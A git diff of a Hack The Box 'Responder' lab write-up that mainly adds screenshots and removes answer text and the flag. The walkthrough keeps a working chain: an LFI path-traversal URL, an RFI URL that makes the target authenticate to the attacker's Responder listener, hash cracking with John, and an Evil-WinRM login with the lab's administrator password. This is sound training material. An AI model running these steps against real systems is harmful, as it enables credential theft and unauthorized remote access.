@@ -2,7 +2,7 @@
 
 > **Difficulty:** Very Easy | **Tier:** Starting Point Tier 1 | **Tags:** LFI, RFI, NTLM, Hash Cracking, Evil-WinRM, Windows
 
-Another day, another box! Today we're exploiting a Local File Include vulnerability to steal NTLM credentials using Responder, cracking the hash with John The Ripper, and getting a shell via Evil-WinRM 😄 Let's dive in 🚀
+Another day, another box! Today we're exploiting a Remote File Include vulnerability to steal NTLM credentials using Responder, cracking the hash with John The Ripper, and getting a shell via Evil-WinRM 😄 Let's dive in 🚀
 
 ---
 
@@ -29,7 +29,7 @@ sudo openvpn your-htb-vpn-file.ovpn
 
 Spawn the Responder machine. My target IP was `10.129.107.48`.
 
-<!-- ADD: machine_IP.png here -->
+<img width="1387" height="105" alt="machine IP" src="https://github.com/user-attachments/assets/9c0fd42f-b9e5-47a2-a038-0576a6ace861" />
 
 ---
 
@@ -43,7 +43,7 @@ ping -c 4 10.129.107.48
 
 All 4 packets returned with 0% packet loss. Target is alive. ✅
 
-<!-- ADD: ping_check.png here -->
+<img width="524" height="173" alt="ping check" src="https://github.com/user-attachments/assets/c622a68d-7863-416f-b071-651ef5be20a0" />
 
 ---
 
@@ -55,44 +55,36 @@ Run a full service version scan:
 nmap -sVC -T4 10.129.107.48
 ```
 
-<!-- ADD: nmap__scan.png here -->
+<img width="795" height="266" alt="nmap  scan" src="https://github.com/user-attachments/assets/c1fe3d43-9752-4b91-a187-a51cdcb43ba9" />
 
-**Results:**
-
-```
-PORT     STATE SERVICE VERSION
-80/tcp   open  http    Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
-5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-Service Info: OS: Windows
-```
 
 Two open ports:
 - **Port 80** — Apache web server running PHP on Windows
 - **Port 5985** — WinRM (Windows Remote Management) — this is what we'll use later to get a shell
 
-The WinRM service listens on port **5985** (Task 10).
-
 ---
 
 ## Step 3 — Web Enumeration
 
-Visit `http://10.129.107.48` in the browser. The site redirects us to `unika.htb` (Task 1).
+Visit `http://10.129.107.48` in the browser. The site redirects us to `unika.htb`.
 
 To make this work, add it to your `/etc/hosts` file:
+
+<img width="507" height="187" alt="etc host" src="https://github.com/user-attachments/assets/1a0e253f-62b1-41aa-b7cd-ea6c3986c689" />
 
 ```bash
 echo "10.129.107.48 unika.htb" | sudo tee -a /etc/hosts
 ```
 
-Now visit `http://unika.htb`. The site is built with **PHP** (Task 2).
+Now visit `http://unika.htb`.
 
 Looking at the URL when switching languages, we can see a `page` parameter being used:
+
+<img width="1910" height="982" alt="web page 1" src="https://github.com/user-attachments/assets/6074c946-938a-4025-96a2-f307bfa3a938" />
 
 ```
 http://unika.htb/index.php?page=french.html
 ```
-
-The URL parameter used to load different language versions is **`page`** (Task 3).
 
 ---
 
@@ -103,10 +95,9 @@ The `page` parameter loads files directly — this is a classic **Local File Inc
 ```
 http://unika.htb/?page=../../../../../../../../windows/system32/drivers/etc/hosts
 ```
+<img width="1919" height="591" alt="web page 2" src="https://github.com/user-attachments/assets/7ef78ccb-7e5d-4e79-94c7-0989c0af0fd9" />
 
-This is an example of exploiting LFI (Task 4).
-
-For **Remote File Inclusion (RFI)**, we can point the parameter to a file on our own machine (Task 5):
+For **Remote File Inclusion (RFI)**, we can point the parameter to a file on our own machine.
 
 ```
 //10.10.14.6/somefile
@@ -124,8 +115,8 @@ Before running Responder, find your tun0 (VPN) interface IP:
 ip a
 ```
 
-<!-- ADD: ip_info.png here -->
-<!-- ADD: ip_details.png here -->
+<img width="979" height="411" alt="ip info" src="https://github.com/user-attachments/assets/e9e9e2f7-76bd-4dbe-9b10-96adb65dd70d" />
+
 
 My tun0 IP was `10.10.16.123`. This is the IP we'll use with Responder.
 
@@ -133,7 +124,7 @@ My tun0 IP was `10.10.16.123`. This is the IP we'll use with Responder.
 
 ## Step 6 — Start Responder
 
-**NTLM** stands for **New Technology LAN Manager** (Task 6) — it is Windows' challenge-response authentication protocol. When we point the RFI to our machine, Windows tries to authenticate using NTLM, and Responder captures that hash.
+NTLM is Windows' challenge-response authentication protocol. When we point the RFI to our machine, Windows tries to authenticate using NTLM, and Responder captures that hash.
 
 First check the Responder interface flag:
 
@@ -141,9 +132,8 @@ First check the Responder interface flag:
 responder -h | grep interface
 ```
 
-<!-- ADD: responder_help.png here -->
+<img width="573" height="76" alt="responder help" src="https://github.com/user-attachments/assets/718f6763-0154-404c-841a-4ad7c14cb9ca" />
 
-The flag to specify the network interface is **`-I`** (Task 7).
 
 Now run Responder on the tun0 interface:
 
@@ -151,7 +141,7 @@ Now run Responder on the tun0 interface:
 sudo responder -I tun0 -v
 ```
 
-<!-- ADD: responder_command.png here -->
+<img width="475" height="107" alt="responder command" src="https://github.com/user-attachments/assets/c70ebf66-06a4-4b65-a8fb-16b8052b7faa" />
 
 ---
 
@@ -162,10 +152,11 @@ With Responder listening, trigger the RFI by visiting this URL in the browser (r
 ```
 http://unika.htb/?page=//10.10.16.123/somefile
 ```
+<img width="1609" height="506" alt="web page 3" src="https://github.com/user-attachments/assets/61f444ba-aa91-42eb-aa2f-81f76b1cd99f" />
 
 Windows tries to authenticate to our fake SMB server and Responder captures the NTLMv2 hash!
 
-<!-- ADD: responder_response.png here -->
+<img width="1906" height="427" alt="responder response" src="https://github.com/user-attachments/assets/d247150d-494e-43a5-b99d-b0081a583ca6" />
 
 ```
 [SMB] NTLMv2-SSP Username : Administrator
@@ -182,7 +173,7 @@ Copy the full hash into a file:
 echo "Administrator::RESPONDER:..." > admin.hash
 ```
 
-<!-- ADD: copy_hash_into_file.png here -->
+<img width="1904" height="72" alt="copy hash into file" src="https://github.com/user-attachments/assets/cb772ed5-9662-430f-85c8-ec7fbe332ba4" />
 
 ---
 
@@ -193,16 +184,8 @@ The tool used to crack NetNTLMv2 hashes is **John The Ripper** (Task 8):
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
 ```
+<img width="801" height="150" alt="crack the hash" src="https://github.com/user-attachments/assets/570415f6-bf4e-4892-b717-a6d103fccd10" />
 
-<!-- ADD: crack_the_hash.png here -->
-
-**Result:**
-
-```
-badminton    (Administrator)
-```
-
-The administrator password is **`badminton`** (Task 9).
 
 ---
 
@@ -214,24 +197,17 @@ Now use Evil-WinRM to connect to port 5985 with the cracked credentials:
 sudo evil-winrm -u Administrator -p badminton -i 10.129.107.48
 ```
 
-We're in! Navigate to find the flag. The flag is on **mike's** desktop (Task 11):
+We're in! Navigate to find the flag.
 
 ```powershell
 cd C:\Users\mike\Desktop
 cat flag.txt
 ```
 
-<!-- ADD: evil_winrm_output.png here -->
+<img width="1082" height="853" alt="evil winrm output" src="https://github.com/user-attachments/assets/3ba4dba3-0e9a-4345-9c1f-bcdf374d9776" />
 
 ---
 
-## Flag
-
-```
-ea81b7afddd03efaa0945333ed147fac
-```
-
----
 
 ## Task Answers
 
